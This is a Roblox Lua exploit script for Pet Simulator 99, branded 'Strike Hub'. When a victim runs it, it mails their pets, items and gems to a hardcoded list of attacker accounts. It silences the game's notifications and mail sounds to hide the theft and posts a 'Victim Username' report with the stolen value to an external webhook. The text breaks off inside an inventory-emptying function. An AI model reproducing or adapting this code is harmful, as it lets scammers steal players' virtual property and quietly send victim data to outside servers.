_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- find mail price function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if type(func) == "function" then
        local ok, info = pcall(function() return debug.getinfo(func).name end)
        if ok and info == "computeSendMailCost" then
            FunctionToGetFirstPriceOfMail = func
            break
        end
    end
end

local mailSendPrice = 0
if FunctionToGetFirstPriceOfMail then
    local ok, val = pcall(FunctionToGetFirstPriceOfMail)
    if ok and type(val) == "number" then
        mailSendPrice = val
    else
        mailSendPrice = 1000
    end
else
    mailSendPrice = 1000
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am or 1
        break
    end
end

local function formatNumber(number)
    local number = math.floor(tonumber(number) or 0)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = {["embeds"] = {{
        ["title"] = "\240\159\144\177 New PS99 Execution",
        ["color"] = 65280,
        ["fields"] = fields,
        ["footer"] = {["text"] = "Strike Hub."}
    }}}

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)
    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
end

-- disable sounds and notifications
local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
if loading then loading.Disabled = true end
if noti then
    noti:GetPropertyChangedSignal("Enabled"):Connect(function() noti.Enabled = false end)
    noti.Enabled = false
end

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
        AbstractGetRAP = function(self) return nil end
    }) or 0)
end

-- SEND ITEM
local function sendItem(category, uid, am)
    local remaining = am or 1
    local maxUsers = #users

    while remaining > 0 do
        if GemAmount1 <= mailSendPrice then return false end
        local sentThisUnit = false
        local userIndex = 1

        while userIndex <= maxUsers do
            local currentUser = users[userIndex]
            local args = {
                [1] = currentUser,
                [2] = MailMessage,
                [3] = category,
                [4] = uid,
                [5] = (category == "Pet" and 1 or remaining)
            }

            local ok, response, err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
            if ok then
                if response == true then
                    sentThisUnit = true
                    remaining = remaining - (category == "Pet" and 1 or remaining)
                    GemAmount1 = GemAmount1 - mailSendPrice
                    mailSendPrice = math.ceil(mailSendPrice * 1.5)
                    if mailSendPrice > 5000000 then mailSendPrice = 5000000 end
                    break
                elseif response == false and err == "They don't have enough space!" then
                    userIndex = userIndex + 1
                else
                    userIndex = userIndex + 1
                end
            else
                userIndex = userIndex + 1
            end
        end

        if not sentThisUnit then return false end
    end
    return true
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" and GemAmount1 >= (mailSendPrice + 10000) then
            local amountToSend = GemAmount1 - mailSendPrice
            if amountToSend <= 0 then return end
            local sent = false
            for _, user in ipairs(users) do
                local args = {[1]=user,[2]=MailMessage,[3]="Currency",[4]=i,[5]=amountToSend}
                local ok, response, err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
                if ok and response == true then
                    GemAmount1 = GemAmount1 - amountToSend
                    sent = true
                    break
                end
            end
        end
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if value._uq then
